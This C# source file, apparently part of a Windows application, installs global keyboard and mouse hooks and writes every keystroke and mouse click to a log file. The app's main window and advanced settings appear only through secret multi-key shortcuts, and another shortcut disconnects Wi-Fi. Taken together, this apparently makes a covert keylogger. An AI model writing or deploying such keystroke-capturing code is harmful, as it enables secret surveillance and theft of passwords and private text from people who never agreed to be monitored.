using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace GlobalHooks
{
    class GlobalHooksController
    {
        public delegate void ShowMainWindowHandler();

        public event ShowMainWindowHandler ShowWindow;

        public delegate void ShowAdvancedSettingsHandler();

        public event ShowAdvancedSettingsHandler ShowAdvancedSettings;

        private readonly ConfigurationInfo _configuration;
        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly LogFileController _logFileController;
        private readonly WifiController _wifiController = new WifiController();

        public GlobalHooksController(ConfigurationInfo configuration)
        {
            _configuration = configuration;
            _logFileController = new LogFileController(_configuration);
            _globalHooks.MouseClick += MouseClick;
            _globalHooks.KeyDown += KeyDown;
        }

        private void MouseClick(object sender, MouseEventArgs e)
        {
            _logFileController.LogMouseClick(e.Button.ToString(), e.Location.ToString());
        }

        private void KeyDown(object sender, KeyEventArgs e)
        {
            if (_configuration.ShortcutToDisconnect != null && e.KeyData ==
                (_configuration.ShortcutToDisconnect[0] | _configuration.ShortcutToDisconnect[1]))
            {
                _wifiController.Disconnect();
                return;
            }
            if (_configuration.ShortcutToDisplayTheWindow != null && e.KeyData ==
                (_configuration.ShortcutToDisplayTheWindow[0] | _configuration.ShortcutToDisplayTheWindow[1] |
                 _configuration.ShortcutToDisplayTheWindow[2]))
            {
                ShowWindow?.Invoke();
                return;
            }
            if (_configuration.ShortcutToDisplayAdvancedSettings != null && e.KeyData ==
                (_configuration.ShortcutToDisplayAdvancedSettings[0] |
                 _configuration.ShortcutToDisplayAdvancedSettings[1] |
                 _configuration.ShortcutToDisplayAdvancedSettings[2] |
                 _configuration.ShortcutToDisplayAdvancedSettings[3]))
            {
                ShowAdvancedSettings?.Invoke();
                return;
            }
            _logFileController.LogKeyDown(e.KeyData.ToString());
        }
    }
}
